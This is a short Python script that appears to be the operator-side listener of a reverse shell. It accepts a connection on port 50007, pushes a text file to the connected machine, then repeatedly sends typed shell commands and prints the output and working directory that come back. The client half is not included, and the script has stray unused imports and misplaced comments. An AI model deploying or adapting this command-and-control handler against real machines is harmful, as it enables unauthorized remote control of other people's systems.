from http import client
import socket
from unittest import result
import os
HOST = '127.0.0.1'                 # Symbolic name meaning all available interfaces
PORT = 50007   
SEPARATOR = "<sep>"
           # Arbitrary non-privileged port
s = socket.socket()
s.bind((HOST, PORT))
s.listen(1)
conn, addr = s.accept()
with conn:
    print('Connected by', addr)
    cwd = conn.recv(1024).decode()
    filename = open("tomhanks.txt","r")
    data = filename.read()
    conn.send('tomhanks.txt'.encode("utf-8"))
    conn.send(data.encode('utf-8'))
    while True:
        command = input(f'{cwd} $> ')
        if not command.strip():
            continue
        conn.send(command.encode())
        if command.lower() == "exit":
            break
        output = conn.recv(1024).decode()
        results, cwd = output.split(SEPARATOR)
        print(results)


